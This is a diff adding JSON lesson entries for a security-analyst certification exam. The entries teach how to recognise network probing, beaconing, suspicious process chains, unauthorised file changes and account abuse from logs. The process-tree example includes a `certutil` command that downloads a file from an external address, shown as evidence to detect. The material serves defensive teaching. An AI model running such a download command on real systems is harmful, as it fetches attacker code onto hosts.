@@ -1,0 +1,299 @@
+[
+  {
+    "id": "cs1-2-network-recon-and-callbacks",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Network indicators: probing, callbacks and odd traffic",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "meaning": [
+      "Attackers have to touch the network to learn what is there, to talk to a foothold they already have, and sometimes to knock a service over. Each of those leaves a pattern in firewall, proxy and flow logs that differs from ordinary business traffic.",
+      "An analyst cares because network evidence is often the first sign of a problem and can be read before anyone touches the affected host. The skill is to describe the pattern (who, how often, how much, which port) and match it to the activity it implies."
+    ],
+    "rule": [
+      "Probing shows as many attempts spread across ports or hosts from one source, with few completed connections. One source hitting many ports on a single server suggests a port scan; one source touching the same port on many hosts suggests a host sweep.",
+      "A callback to an attacker-controlled server (beaconing) shows as small, regular exchanges at a steady interval, often around the clock, to a destination with little reputation or history. The regularity is the clue, because people do not browse on a timer.",
+      "A connection on a port the policy does not allow for that system, especially outbound from a server, is suspect on its own. Servers rarely start sessions to the internet, so an established outbound session from one deserves attention even when the port looks harmless.",
+      "A flood shows as a sudden surge in requests, usually from many source addresses, often asking for the same expensive resource, while errors or slowness appear for real users.",
+      "A new hardware address that obtains a Dynamic Host Configuration Protocol (DHCP) lease (an address assigned automatically) but is missing from the asset inventory points to an unapproved or rogue device on the segment."
+    ],
+    "example": {
+      "intro": "A flow extract from the finance virtual local area network (VLAN) shows what one workstation did in a single minute. The analyst must decide whether this is normal.",
+      "table": {
+        "caption": "Flow records, source `ws-0412.example.internal` (`10.20.4.12`)",
+        "head": [
+          "Time (UTC)",
+          "Destination",
+          "Port",
+          "Result"
+        ],
+        "rows": [
+          [
+            "09:14:01",
+            "`10.20.4.21`",
+            "445",
+            "reset"
+          ],
+          [
+            "09:14:01",
+            "`10.20.4.22`",
+            "445",
+            "reset"
+          ],
+          [
+            "09:14:02",
+            "`10.20.4.23`",
+            "445",
+            "open, 0 bytes"
+          ],
+          [
+            "09:14:02",
+            "`10.20.4.24`",
+            "445",
+            "reset"
+          ],
+          [
+            "09:14:03",
+            "`10.20.4.25`",
+            "445",
+            "reset"
+          ]
+        ]
+      },
+      "steps": [
+        "One source, one port, a different destination each time: the destination changes while the port stays fixed, which is the host-sweep shape.",
+        "Almost every attempt ends in a reset and the one that opened carried no data. The source is checking which hosts answer, not using a service.",
+        "A workstation does not normally contact its neighbors on a file sharing port in sequence. Conclude likely internal enumeration, then check the process on the workstation and the time the process started."
+      ]
+    },
+    "trap": {
+      "wrong": "Regular, low-volume traffic to one external address is safe because the volume is tiny.",
+      "why": "Small size is what makes a callback hard to see. Judge the pattern, not the volume: a perfectly even interval around the clock, a fixed small size and a destination nobody can explain mean a beacon. Compare it with how real users behave, which is bursty and tied to working hours."
+    },
+    "checkIds": [
+      "cs4-1-2-mcq-001",
+      "cs4-1-2-mcq-002",
+      "cs4-1-2-mcq-004",
+      "cs4-1-2-mcq-005",
+      "cs4-1-2-mcq-015"
+    ]
+  },
+  {
+    "id": "cs1-2-suspicious-processes",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Host indicators: suspicious processes and resource use",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "meaning": [
+      "Once an attacker runs something on a host, the running process is the evidence. Endpoint tools record which process started which, from what path, with what arguments, and how much of the machine it uses.",
+      "An analyst cares because attackers try to look ordinary. The giveaway is rarely the process alone; it is the mismatch between what a process is and where it came from or what it does."
+    ],
+    "rule": [
+      "Check the parent and child. A document or mail program starting a command shell or script interpreter is not normal office behavior and suggests the file triggered code.",
+      "Check the name, path and parent together. A process with a system-looking name that runs from a user-writable folder, or whose spelling is a near match, is masquerading as a trusted one.",
+      "Built-in administration tools can be misused to download or run content (living off the land). They pass allowlists because they are trusted and signed, so judge the arguments, such as fetching from an external address, rather than the tool name.",
+      "Sustained high processor use with no workload, together with an unfamiliar program file in a temporary folder and traffic to an unfamiliar address, is consistent with unauthorized resource use such as cryptomining.",
+      "Hidden windows, encoded command arguments and work done outside business hours raise suspicion, but each is a reason to look closer, not proof on its own."
+    ],
+    "example": {
+      "intro": "An endpoint detection and response (EDR) alert fires on a reception desktop. The analyst opens the process tree.",
+      "table": {
+        "caption": "Process tree, `ws-0388.example.internal`",
+        "head": [
+          "Process",
+          "Parent",
+          "Path or argument"
+        ],
+        "rows": [
+          [
+            "outlook.exe",
+            "explorer.exe",
+            "normal install folder"
+          ],
+          [
+            "wscript.exe",
+            "outlook.exe",
+            "script in the user temp folder"
+          ],
+          [
+            "cmd.exe",
+            "wscript.exe",
+            "`cmd.exe /c certutil -urlcache -f http://203.0.113.30/a.bin a.bin`"
+          ]
+        ]
+      },
+      "steps": [
+        "The mail client started a script host, which is unusual because mail programs display content rather than run scripts.",
+        "The script host then started a command shell whose argument runs `certutil`, a built-in tool, to fetch a file from the external address `203.0.113.30`, so the chain moves from a message to code execution to a download.",
+        "Each tool is legitimate on its own, so the evidence is the chain. Conclude a malicious attachment or link was opened, isolate the host and collect the script."
+      ]
+    },
+    "trap": {
+      "wrong": "Every process in the chain is a signed, built-in tool, so the activity is benign.",
+      "why": "Trusted tools are exactly what attackers prefer because they pass allowlists. Ask whether this parent should start this child, from this path, with these arguments. A chain that breaks the usual pattern is an indicator even when each part is legitimate."
+    },
+    "checkIds": [
+      "cs4-1-2-mcq-006",
+      "cs4-1-2-mcq-008",
+      "cs4-1-2-mcq-009",
+      "cs4-1-2-mcq-027",
+      "cs4-1-2-mcq-029"
+    ]
+  },
+  {
+    "id": "cs1-2-file-config-changes",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Changes that should not have happened",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "meaning": [
+      "Compromise often leaves a trail of changes: new files, new scheduled jobs, new software, altered settings and weakened logging. Many are made to keep access or to hide what came before.",
+      "An analyst cares because a change is easy to compare with a baseline and an approved change record. A change with no matching ticket, made at an odd time or by an unexpected account, is an indicator worth escalating."
+    ],
+    "rule": [
+      "Compare with the approved record. A new file, rule or installed program with no change ticket and no matching approved list entry is unauthorized until someone explains it.",
+      "New scheduled jobs and startup entries are persistence: they bring the attacker's code back after a reboot. A file integrity monitor reporting one in a system folder is a prompt to inspect it.",
+      "Many files renamed with a new extension in a short time, plus a note in each folder, is the pattern of ransomware in progress. Speed matters, so contain the affected host before further analysis.",
+      "Turning off or reducing audit logging, especially soon after unusual activity, is defense evasion (hiding activity from defenders). Missing logs can themselves be the indicator.",
+      "A firewall or access change made outside a change window that opens a sensitive service to any source is a strong indicator of tampering or an insider acting without approval."
+    ],
+    "example": {
+      "intro": "A file integrity monitor reports changes on a public web server overnight. No deployment was planned.",
+      "table": {
+        "caption": "Integrity alerts, `web-03.example.internal`",
+        "head": [
+          "Time (UTC)",
+          "Event",
+          "Path",
+          "Owner"
+        ],
+        "rows": [
+          [
+            "02:31:07",
+            "created",
+            "/var/www/uploads/view.php",
+            "web service user"
+          ],
+          [
+            "02:31:40",
+            "modified",
+            "/var/www/site/index.html",
+            "web service user"
+          ],
+          [
+            "02:33:12",
+            "log cleared",
+            "/var/log/access.log",
+            "root"
+          ]
+        ]
+      },
+      "steps": [
+        "A new script file, `view.php`, appeared in an upload folder. Upload folders should hold user content, not executable files, and no deployment was scheduled.",
+        "The home page was changed through the same web service account, so the changes are consistent with one intrusion through the web service. The account name alone does not show who the actor was.",
+        "The access log was then cleared as root, a different account, so the web service account was likely escalated to root or a second credential was used. Treat the host as fully compromised.",
+        "Clearing the log removes the evidence of how the file arrived. Together the changes point to a possible web shell (a script that lets an attacker run commands through the web server), defacement and cover-up. Preserve the disk and logs before cleaning."
+      ]
+    },
+    "trap": {
+      "wrong": "Files created by the web service user are normal because that account owns web content.",
+      "why": "Ownership says who wrote the file, not whether the write was approved. Check the change record, the folder's purpose and the time. A write outside a deployment window into a folder that should hold only uploads is an indicator whatever account made it."
+    },
+    "checkIds": [
+      "cs4-1-2-mcq-007",
+      "cs4-1-2-mcq-010",
+      "cs4-1-2-mcq-011",
+      "cs4-1-2-mcq-013",
+      "cs4-1-2-mcq-014"
+    ]
+  },
+  {
+    "id": "cs1-2-account-abuse",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Account indicators: guessing, fatigue and misuse",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "meaning": [
+      "Stolen or guessed credentials let an attacker act as a real user. Authentication logs show how access was gained and how the account behaves afterward.",
+      "An analyst cares because the log pattern separates different attacks that all look like failed sign-ins: one account hammered, many accounts tried gently, or a user worn down by prompts. The pattern also tells you what to contain."
+    ],
+    "rule": [
+      "Password guessing against one account shows as many failures in a row for that name, sometimes followed by a success. A success after a run of failures from the same source address is the key moment.",
+      "Password spraying tries a few common passwords across many accounts, so each account sees only one or two failures and lockout rules stay quiet. Look across accounts and sources, not within one account.",
+      "Account enumeration shows as different error wording for unknown users and wrong passwords. The differences let an attacker learn which names exist.",
+      "Repeated approval prompts that the user denies, followed by an approval, suggest prompt fatigue: the attacker already has the password and is wearing down the second factor.",
+      "A service account that normally never signs in interactively but shows an interactive or remote logon indicates a compromised or shared credential. A user signing in from two places too far apart for the time between them indicates the same."
+    ],
+    "example": {
+      "intro": "The virtual private network (VPN) log for one user shows the extract below. The analyst must say what happened.",
+      "table": {
+        "caption": "VPN authentication, user mlarsen, source `198.51.100.62`, not seen for this user before",
+        "head": [
+          "Time (UTC)",
+          "Result",
+          "Note"
+        ],
+        "rows": [
+          [
+            "01:10:02",
+            "failed",
+            "wrong password"
+          ],
+          [
+            "01:10:05",
+            "failed",
+            "wrong password"
+          ],
+          [
+            "01:10:09",
+            "failed",
+            "wrong password"
+          ],
+          [
+            "01:10:12",
+            "failed",
+            "wrong password"
+          ],
+          [
+            "01:10:16",
+            "failed",
+            "wrong password"
+          ],
+          [
+            "01:10:21",
+            "success",
+            "password accepted"
+          ],
+          [
+            "01:10:47",
+            "success",
+            "new second-factor device registered"
+          ]
+        ]
+      },
+      "steps": [
+        "Five quick failures for one account from an address new to this user look like guessing. A user mistyping, autofill or a retry loop would not usually come from a new address.",
+        "The success right after means the attacker found or already knew the password.",
+        "Registering a new second-factor device twenty-six seconds later is a persistence step. Disable the session and the new device, reset the password, and review what the account reached."
+      ]
+    },
+    "trap": {
+      "wrong": "Each account has only one or two failed sign-ins, so there is no attack because nobody was locked out.",
+      "why": "Low counts per account are the design of spraying, built to stay under lockout limits. Aggregate by source, by time and by the password pattern across all accounts. Thousands of accounts each failing a couple of times in the same window is the indicator."
+    },
+    "checkIds": [
+      "cs4-1-2-mcq-003",
+      "cs4-1-2-mcq-017",
+      "cs4-1-2-mcq-022",
+      "cs4-1-2-mcq-023",
+      "cs4-1-2-mcq-031"
+    ]
+  }
+]
